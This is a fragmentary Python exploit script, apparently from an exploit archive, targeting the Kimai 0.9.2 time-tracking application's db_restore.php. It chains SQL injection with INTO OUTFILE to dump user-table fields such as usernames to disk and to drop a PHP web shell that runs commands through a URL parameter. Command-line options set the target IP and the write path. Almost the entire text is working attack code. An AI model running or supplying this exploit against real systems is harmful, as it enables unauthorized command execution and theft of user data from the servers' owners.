...
# Software Link: 
https://downloads.sourceforge.net/project/kimai/0.9.x/kimai.0.9.2.1306-3.zip
...
def webshell(options, id):
    """ dat webshell
    """
    shell = ''.join(random.choice(string.ascii_lowercase+string.digits) 
for x in range(5))
    sqli = 
('http://www.example.com/kimai/db_restore.php?dates%5B%5D={1}_kimai_var%20UNION'
    ...
    print '[!] Shell dropped.  Go hit 
http://%s/kimai/%s.php?rr=ls'%(options.ip, shell)
 
def fetch_id(options):
    id = None
    try:
        page = 
urllib2.urlopen('http://%s/kimai/db_restore.php'%options.ip).read()
...
urllib2.urlopen('http://www.example.com/%s/kimai/db_restore.php?submit=create+backup'%options.ip)
...
'%20SELECT%20{3}%20FROM%20kimai_usr%20INTO%20OUTFILE%20\'{2}/{3}\';--%20&submit=recover')
    ...
    urllib2.urlopen(sqli.format(options.ip, id, options.path, 
'usr_name'))
...
dest='ip')
    parser.add_argument('-p', help='path to dump files (otherwise 
guesses /var/www/kimai)',
                        action='store',default='/var/www/kimai', 
dest='path')
    parser.add_argument('-w', help='web shell', action='store_true', 
dest='shell')
    ...
    options.path = options.path if options.path[-1] != '/' else 
options.path[:-1]
    return options
